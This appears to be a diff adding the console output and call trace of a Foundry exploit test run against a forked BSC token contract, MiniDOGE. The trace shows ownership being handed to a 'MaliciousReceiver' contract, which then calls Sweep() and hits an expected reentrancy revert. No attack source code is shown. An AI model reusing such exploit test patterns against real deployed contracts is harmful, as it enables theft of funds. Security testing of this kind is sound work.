@@ -1,0 +1,43 @@
+No files changed, compilation skipped
+2026-06-16T13:00:27.948185Z  WARN foundry_fork_db::cache: Failed to read cache file err=Os { code: 2, kind: NotFound, message: "No such file or directory" } path="/Users/carl/.foundry/cache/rpc/bsc/104570531"
+
+Ran 1 test for test/Exploit.t.sol:ExploitTest
+[PASS] testTransferVulnerability() (gas: 125880)
+2026-06-16T13:00:31.246877Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x5615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
+2026-06-16T13:00:31.248920Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T13:00:31.249038Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T13:00:31.250058Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T13:00:31.250160Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T13:00:31.250240Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T13:00:31.250309Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x5615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
+2026-06-16T13:00:31.250365Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+Traces:
+  [125880] ExploitTest::testTransferVulnerability()
+    ├─ [2421] MiniDOGE::owner() [staticcall]
+    │   └─ ← [Return] Owner: [0x5E0115e727484BFE523B32E96c060d0FDD30097A]
+    ├─ [0] VM::label(Owner: [0x5E0115e727484BFE523B32E96c060d0FDD30097A], "Owner")
+    │   └─ ← [Return]
+    ├─ [66115] → new MaliciousReceiver@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 330 bytes of code
+    ├─ [0] VM::label(MaliciousReceiver: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], "MaliciousReceiver")
+    │   └─ ← [Return]
+    ├─ [0] VM::deal(MiniDOGE: [0xBa07EED3d09055d60CAEf2bDfCa1c05792f2dFad], 1000000000000000000 [1e18])
+    │   └─ ← [Return]
+    ├─ [0] VM::prank(Owner: [0x5E0115e727484BFE523B32E96c060d0FDD30097A])
+    │   └─ ← [Return]
+    ├─ [5359] MiniDOGE::transferOwnership(MaliciousReceiver: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   ├─ emit OwnershipTransferred(previousOwner: Owner: [0x5E0115e727484BFE523B32E96c060d0FDD30097A], newOwner: MaliciousReceiver: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(MaliciousReceiver: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   └─ ← [Return]
+    ├─ [0] VM::expectRevert(custom error 0xf4844814)
+    │   └─ ← [Return]
+    ├─ [9711] MiniDOGE::Sweep()
+    │   ├─ [62] MaliciousReceiver::receive{value: 1000000000000000000}()
+    │   │   └─ ← [ReentrancySentryOOG] EvmError: ReentrancySentryOOG
+    │   └─ ← [Revert] EvmError: Revert
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.29s (1.26s CPU time)
+
+Ran 1 test suite in 5.70s (3.29s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
